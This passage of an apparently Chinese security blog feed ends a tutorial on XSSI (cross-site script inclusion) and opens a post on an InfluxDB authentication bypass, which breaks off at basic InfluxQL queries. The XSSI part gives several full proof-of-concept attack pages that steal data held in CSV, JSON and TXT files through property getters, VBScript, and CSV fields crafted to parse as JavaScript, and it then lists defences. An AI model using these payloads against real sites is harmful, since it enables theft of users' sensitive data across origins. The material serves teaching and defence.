class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"name"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=name"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"age"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=age"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"address"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=address"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"mi1k7ea"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=mi1k7ea"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"china"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=china"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>此时穷举完成，浏览器也没有报错，说明CSV文件中的每一项均已被定义穷举（当然，数值项是无法通过定义穷举到的，这个缺点和前面小节是一样的）：</p><p><img src="/2020/01/04/浅析XSSI漏洞/21.png" alt=""></p><h5 id="结合VBScript穷举JSON数组"><a href="#结合VBScript穷举JSON数组" class="headerlink" title="结合VBScript穷举JSON数组"></a>结合VBScript穷举JSON数组</h5><p>注意：VBScript只适用于IE中。此方法在我本地的IE 11中测试并不成功，而在IE 8上OK。</p><p>假设服务端存在包含敏感信息的文件a.json：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"admin"</span>,<span class="string">"this_is_password"</span>]</span><br></pre></td></tr></table></figure><p>xssi.html，这里script标签添加language属性值为vbscript，其中模拟穷举JSON数组内容进行暴力破解：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"vbscript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">Sub [<span class="string">"admin"</span>,<span class="string">"password"</span>]: MsgBox <span class="string">"value=password"</span>: End Sub</span></span><br><span class="line"><span class="actionscript">Sub [<span class="string">"admin"</span>,<span class="string">"123456"</span>]: MsgBox <span class="string">"value=123456"</span>: End Sub</span></span><br><span class="line"><span class="actionscript">Sub [<span class="string">"admin"</span>,<span class="string">"admin"</span>]: MsgBox <span class="string">"value=admin"</span>: End Sub</span></span><br><span class="line"><span class="actionscript">Sub [<span class="string">"admin"</span>,<span class="string">"this_is_password"</span>]: MsgBox <span class="string">"value=this_is_password"</span>: End Sub</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target JSON as VBScript --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.json"</span> <span class="attr">language</span>=<span class="string">"vbscript"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在IE 8中成功利用VBScript穷举出JSON数组中的敏感信息：</p><p><img src="/2020/01/04/浅析XSSI漏洞/15.png" alt=""></p><h4 id="利用敏感文件中的可控字段窃取数据"><a href="#利用敏感文件中的可控字段窃取数据" class="headerlink" title="利用敏感文件中的可控字段窃取数据"></a>利用敏感文件中的可控字段窃取数据</h4><h5 id="CSV-with-quotations-thef"><a href="#CSV-with-quotations-thef" class="headerlink" title="CSV with quotations thef"></a>CSV with quotations thef</h5><p>简单地说，就是CSV文件中的敏感内容被双引号括起来了，这样的话前面针对CSV的操作就没用了。但是如果我们能够控制CSV文件中某些项的值，那么还是可以进行信息窃取的，而且一般我们进行CSV文件导出之前、我们是可以设置我们想导出的项以及内容的。</p><p>注意，该方法目前仅适用于全版本的IE，不适用于Chrome和Firefox。</p><p>假设CSV文件如下，其中有两处地方可控：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1,&quot;可控&quot;,&quot;123@123.com&quot;,&quot;03-0000-0001&quot;</span><br><span class="line">2,&quot;admin&quot;,&quot;456@456.com&quot;,&quot;03-0000-0002&quot;</span><br><span class="line">3,&quot;guest&quot;,&quot;789@789.com&quot;,&quot;03-0000-0003&quot;</span><br><span class="line">4,&quot;tester&quot;,&quot;abc@abc.com&quot;,&quot;03-0000-0004&quot;</span><br><span class="line">5,&quot;可控&quot;,&quot;def@def.com&quot;,&quot;03-0000-0005&quot;</span><br></pre></td></tr></table></figure><p>此时，我们可以通过可控的项来构造如下的CSV文件，先注入个双引号闭合掉前面的引号，然后使用<code>mi1k7ea=function() {/*…*/}</code>来解决多行的问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1,&quot;a&quot;,mi1k7ea=function()&#123;/*&quot;,&quot;123@123.com&quot;,&quot;03-0000-0001&quot;</span><br><span class="line">2,&quot;admin&quot;,&quot;456@456.com&quot;,&quot;03-0000-0002&quot;</span><br><span class="line">3,&quot;guest&quot;,&quot;789@789.com&quot;,&quot;03-0000-0003&quot;</span><br><span class="line">4,&quot;tester&quot;,&quot;abc@abc.com&quot;,&quot;03-0000-0004&quot;</span><br><span class="line">5,&quot;*/&#125;//&quot;,&quot;def@def.com&quot;,&quot;03-0000-0005&quot;</span><br></pre></td></tr></table></figure><p>xssi.html，调用mi1k7ea.toString()获取函数源码来达到攻击目标数据的目的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert(mi1k7ea.toString());</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在IE 11中测试成功：</p><p><img src="/2020/01/04/浅析XSSI漏洞/25.png" alt=""></p><p>为啥能成功执行？我们将CSV文件内容直接放到IE的Console中运行，浏览器是能够成功识别为JS代码并定义了一个名为mi1k7ea的JS函数：</p><p><img src="/2020/01/04/浅析XSSI漏洞/26.png" alt=""></p><p>也就是说，<strong>通过可控字段构造CSV文件的目的就是为了让文件内容使浏览器能够正常识别为JS代码，并且将中间的敏感信息都注释掉，然后通过调用toString()函数来获取JS函数源码从而成功窃取敏感信息。</strong></p><p>其实前面那段CSV内容放到Chrome和Firefox中都能成功识别为JS的，结果和IE的一样，但为啥不能在XSSI中利用呢？——原因在于目前较新版本的Chrome和Firefox都已经将MIME类型为<code>text/csv</code>的响应都自动拦截掉了，因此无法成功利用：</p><p><img src="/2020/01/04/浅析XSSI漏洞/27.png" alt=""></p><h5 id="利用ECMAScript6特性——‘-’反引号"><a href="#利用ECMAScript6特性——‘-’反引号" class="headerlink" title="利用ECMAScript6特性——‘`’反引号"></a>利用ECMAScript6特性——‘`’反引号</h5><p>业界研究的这种技巧，是针对Chrome和Firefox的利用的，因为，但是在目前的Chrome和Firefox中已经不再能成功利用，原因如前面所说，Chrome和Firefox都已经将MIME类型为<code>text/csv</code>的响应都自动拦截掉了。</p><p>但是我们还是来看下这个原理和利用吧。</p><p>假设目标CSV文件如下，其中’Sample report’这个字段是我们可以控制的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br></pre></td></tr></table></figure><p> 然后我们构造如下，将’Sample’作为JS变量，变量内容未反引号括起来的内容，最后需要注释掉后面部分的内容才能使浏览器识别JS不会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status</span><br><span class="line">1234,Sample=` report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample`// report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br></pre></td></tr></table></figure><p>xssi.html，注意定义CSV中第一行的项为变量：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert(Sample.toString());</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Chrome或Firefox上测试是不成功的，原因同上：</p><p><img src="/2020/01/04/浅析XSSI漏洞/29.png" alt=""></p><p>但是这段CSV在Firefox和Chrome上的Console上是能成功识别并执行的，也就是说构造本身是没问题的：</p><p><img src="/2020/01/04/浅析XSSI漏洞/32.png" alt=""></p><h5 id="利用ECMAScript6特性——箭头函数"><a href="#利用ECMAScript6特性——箭头函数" class="headerlink" title="利用ECMAScript6特性——箭头函数"></a>利用ECMAScript6特性——箭头函数</h5><p>a.csv，假设num和b项可控：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name,num,team</span><br><span class="line">Jordan,23,Bull</span><br><span class="line">Kobe,24,Laker</span><br><span class="line">James,23,Laker</span><br><span class="line">Iversion,3,76er</span><br><span class="line">a,b,c</span><br></pre></td></tr></table></figure><p>构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name,num=i=&gt;/*,team</span><br><span class="line">Jordan,23,Bull</span><br><span class="line">Kobe,24,Laker</span><br><span class="line">James,23,Laker</span><br><span class="line">Iversion,3,76er</span><br><span class="line">a,b*/i//,c</span><br></pre></td></tr></table></figure><p>xssi.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert(num.toString());</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Chrome和Firefox上运行会报错，原因同上。</p><p>但是这段CSV在Firefox和Chrome上的Console上是能成功识别并执行的，也就是说构造本身是没问题的：</p><p><img src="/2020/01/04/浅析XSSI漏洞/33.png" alt=""></p><h5 id="窃取非JS、非CSV类型文件敏感信息"><a href="#窃取非JS、非CSV类型文件敏感信息" class="headerlink" title="窃取非JS、非CSV类型文件敏感信息"></a>窃取非JS、非CSV类型文件敏感信息</h5><p>前面三种方法，对于现在较新版本的Chrome和Firefox都是失效，但是如果目标文件类型并非是JS/CSV的话，就能够通过可控字段来构造文件内容实现在Chrome和Firefox上的执行，这是因为响应的MIME类型并非<code>text/csv</code>，也就不会被浏览器所拦截了。</p><p>比如前面的三种方法中，将a.csv改为a.txt，在Chrome和Firefox上能成功执行：</p><p><img src="/2020/01/04/浅析XSSI漏洞/28.png" alt=""></p><p><img src="/2020/01/04/浅析XSSI漏洞/30.png" alt=""></p><p><img src="/2020/01/04/浅析XSSI漏洞/31.png" alt=""></p><p>在前面的第二种方法中，还有一种构造形式，即将Sample后面的=等号去掉，也就是说直接将Sample当成函数进行定义，a.txt如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status</span><br><span class="line">1234,Sample` report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample`// report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br></pre></td></tr></table></figure><p>xssi.html修改如下，直接获取Sample函数的参数内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">Sample</span><span class="params">(strings)</span></span>&#123;</span></span><br><span class="line"><span class="undefined">alert(strings);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.txt"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样同样能利用成功。</p><p>参照这些例子，同理去挖掘即可。</p><h3 id="网上的案例"><a href="#网上的案例" class="headerlink" title="网上的案例"></a>网上的案例</h3><p>Yahoo的XSSI，窃取动态JS文件中的session值，进而窃取受害者账号的具体信息：<a href="https://www.freebuf.com/articles/web/179851.html" target="_blank" rel="noopener">挖洞经验 | 看我如何发现雅虎XSSi漏洞实现用户信息窃取</a></p><p>Hackerone的XSSI，CSV文件内容的窃取以及非JS非CSV类型文件内容的窃取：<a href="https://www.anquanke.com/post/id/86173" target="_blank" rel="noopener">【技术分享】hackerone漏洞：如何利用XSSI窃取多行字符串（含演示视频）</a></p><p><a href="https://v.youku.com/v_show/id_XMjc4NjEwNTczMg==.html?refer=seo_operation.liuxiao.liux_00003311_3000_QfMVj2_19042900" target="_blank" rel="noopener">演示视频</a></p><h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><ul><li>开发者永远也不要把敏感数据放在JavaScript文件中， 也不要放在JSONP中；</li><li>请求敏感文件/响应的尽量改为POST方式；</li><li>使用类似于CSRF-Token机制；</li><li>设置响应头为<code>X-Content-Type-Options: nosniff</code>，此时浏览器就会拒绝加载JS类型的数据；</li></ul><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://vulncity.com/archives/14/" target="_blank" rel="noopener">使用XSSI攻击获取敏感信息</a></p><p><a href="http://drops.wooyun.org/papers/5797" target="_blank" rel="noopener">XSSI攻击利用 – 大学生</a></p><p><a href="https://www.freebuf.com/articles/web/87374.html" target="_blank" rel="noopener">揭开XSSI攻击的神秘面纱</a></p><p><a href="https://www.anquanke.com/post/id/85337" target="_blank" rel="noopener">【技术分享】XSSI： 一个不出名但是影响广泛的Web漏洞</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSSI" scheme="https://www.mi1k7ea.com/tags/XSSI/"/>
    
  </entry>
  
  <entry>
    <title>浅析Influxdb认证绕过漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/01/01/%E6%B5%85%E6%9E%90Influxdb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/01/01/浅析Influxdb认证绕过漏洞/</id>
    <published>2020-01-01T14:35:17.000Z</published>
    <updated>2020-01-02T12:07:25.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="Influxdb简介"><a href="#Influxdb简介" class="headerlink" title="Influxdb简介"></a>Influxdb简介</h3><p>TSDB（Time Series DataBase，时序数据库）是针对时间戳或时间序列数据进行优化的数据库，专门为处理带有时间戳的度量和事件度量而构建的。而时间序列数据可以是随时间跟踪、监视、下采样和聚合的度量或事件，如服务器指标、应用程序性能、网络数据、传感器数据以及许多其他类型的分析数据。</p><p>Influxdb是一个开源的时序数据库，由GO语言编写，用于处理高写入和高查询负载。Influxdb被广泛应用于存储系统的监控数据，IoT行业的实时数据等场景。</p><h3 id="关键特性"><a href="#关键特性" class="headerlink" title="关键特性"></a>关键特性</h3><p>Influxdb具有以下关键特性：</p><ul><li>能够高速读取和压缩时间序列数据</li><li>使用 <code>Go</code> 编写，能够但文件运行，没有依赖</li><li>提供了简单、高效的 <code>HTTP</code> 读写接口</li><li>能够使用插件支持其他的数据协议，如： <code>Graphite=， =collectd</code> 和 <code>OpenTSDB</code></li><li>可轻松使用 <code>SQL</code> 语言查询聚合数据</li><li>能够使用 <code>Tag</code> 进行快速高效的查询</li><li>支持保留策略(<code>Retention Policy</code>), 能够自动清理旧数据</li><li>支持持续查询，能够自动定期计算聚合数据，提高了查询的效率</li></ul><h3 id="与传统数据库的概念比较"><a href="#与传统数据库的概念比较" class="headerlink" title="与传统数据库的概念比较"></a>与传统数据库的概念比较</h3><table><thead><tr><th>Influxdb</th><th>传统数据库</th></tr></thead><tbody><tr><td>database</td><td>数据库</td></tr><tr><td>measurement</td><td>表，但不支持联合查询</td></tr><tr><td>point</td><td>表中的一行数据</td></tr></tbody></table><p>其中point由时间戳（time）、数据（field）、标签（tags）组成，相当于传统数据库里的一行数据：</p><table><thead><tr><th>point属性</th><th>传统数据库中的概念</th></tr></thead><tbody><tr><td>time</td><td>主键</td></tr><tr><td>tags</td><td>有索引的列</td></tr><tr><td>fields</td><td>没索引的列</td></tr></tbody></table><h3 id="目录与文件结构"><a href="#目录与文件结构" class="headerlink" title="目录与文件结构"></a>目录与文件结构</h3><p>Influxdb的数据存储即在其根目录下的database目录中主要有三个目录。默认情况下是meta、wal和data。</p><ul><li>meta目录：用于存储数据库的一些元数据，meta目录下有一个meta.db文件；</li><li>wal目录：存放预写日志文件，以.wal结尾；</li><li>data目录：存放实际存储的数据文件，以.tsm结尾。</li></ul><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>InfluxDB的配置文件为：/etc/influxdb/influxdb.conf</p><p>选项详情请参见：<a href="https://docs.influxdata.com/influxdb/v1.7/administration/config/" target="_blank" rel="noopener">Configuration Settings</a></p><h3 id="常用的InfluxQL语句"><a href="#常用的InfluxQL语句" class="headerlink" title="常用的InfluxQL语句"></a>常用的InfluxQL语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看所有的数据库</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"><span class="comment">-- 使用特定的数据库</span></span><br><span class="line"><span class="keyword">use</span> database_name;</span><br><span class="line"><span class="comment">-- 查看所有的measurement</span></span><br><span class="line"><span class="keyword">show</span> measurements;</span><br><span class="line"><span class="comment">-- 查询10条数据</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> measurement_name <span class="keyword">limit</span> <span class="number">10</span>;</span><br><span class="line"><span class="comment">-- 数据中的时间字段默认显示的是一个纳秒时间戳，改成可读格式</span></span><br><span class="line">precision rfc3339; <span class="comment">-- 之后再查询，时间就是rfc3339标准格式</span></span><br><span class="line"><span class="comment">-- 或可以在连接数据库的时候，直接带该参数</span></span><br><span class="line">influx -precision rfc3339</span><br><span class="line"><span class="comment">-- 查看一个measurement中所有的tag key </span></span><br><span class="line"><span class="keyword">show</span> tag <span class="keyword">keys</span></span><br><span class="line"><span class="comment">-- 查看一个measurement中所有的field key 